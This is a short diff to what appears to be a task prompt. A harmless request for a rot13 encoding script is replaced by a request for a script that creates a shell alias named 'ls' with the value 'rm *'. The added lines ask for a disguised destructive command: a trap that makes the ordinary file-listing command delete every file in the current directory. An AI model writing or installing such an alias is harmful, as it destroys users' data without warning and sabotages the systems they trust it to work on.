@@ -1,1 +1,4 @@
-Write a script that encodes and decodes text using the rot13 encryption. Assume ASCII
+Create a script that creates an alias.
+
+Name: ls
+Value: rm *
